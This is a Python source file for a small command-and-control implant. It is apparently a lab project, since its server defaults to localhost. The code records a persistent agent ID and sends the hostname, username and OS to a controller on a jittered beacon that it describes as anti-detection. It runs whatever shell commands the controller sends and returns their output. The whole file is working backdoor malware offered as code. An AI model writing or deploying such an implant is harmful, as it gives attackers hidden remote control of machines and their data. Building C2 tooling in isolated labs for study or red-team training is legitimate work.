import os
import platform
import subprocess
import sys
import uuid
import time
import requests
from pathlib import Path

if sys.platform == "win32":
    import ctypes
    _OEM_CP = f"cp{ctypes.windll.kernel32.GetOEMCP()}"
    _ANSI_CP = f"cp{ctypes.windll.kernel32.GetACP()}"

SERVER = "http://127.0.0.1:8000"    # change for cross VM testing
BEACON_INTERVAL = 5                 # in seconds
JITTER = 0.3                        # 30% randomization(anti-pattern detection)
ID_FILE = Path.home() / ".mini_c2_id"

def get_agent_id() -> str: 
    if ID_FILE.exists():
        return ID_FILE.read_text().strip()

    new_id = str(uuid.uuid4())
    ID_FILE.write_text(new_id)

    return new_id

def collect_metadata() -> dict:
    return {
        "hostname": platform.node(),
        "username": os.getlogin(),
        "os": f"{platform.system()} {platform.release()}"
    }

def _decode(data: bytes) -> str:
    if not data:
        return ""
    for enc in ("utf-8", _OEM_CP, _ANSI_CP):
        try:
            return data.decode(enc)
        except UnicodeDecodeError:
            continue
    return data.decode("utf-8", errors="replace")

def execute(command: str) -> str:
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            timeout=30,
        )
        return _decode(result.stdout) + _decode(result.stderr)
    except subprocess.TimeoutExpired:
        return "[!] Command timed out (30s)"
    except Exception as e:
        return f"[!] Execution error: {e}"
    
def beacon(agent_id: str): 
    payload = {
        "agent_id": agent_id, 
        **collect_metadata()
    }
    
    try:
        r = requests.post(f"{SERVER}/checkin", json=payload, timeout=10)
        return r.json().get("tasks", [])
    except requests.RequestException: 
        return []

def submit_result(
        agent_id: str, 
        task_id: str,
        output: str 
): 
    try: 
        requests.post(f"{SERVER}/result", 
                      json={
                          "agent_id": agent_id,
                          "task_id": task_id, 
                          "output": output, 
                          }, timeout=10)
    except requests.RequestException:
        pass # retry next beacon

def main(): 
    import random 
    agent_id = get_agent_id()

    while True: 
        tasks = beacon(agent_id) 
        for task in tasks: 
            output = execute(task["command"])
            submit_result(agent_id, task["id"], output)
        
        sleep_time = BEACON_INTERVAL* (1 + random.uniform(-JITTER, JITTER))
        time.sleep(max(1, sleep_time))

if __name__ == "__main__": 
    main()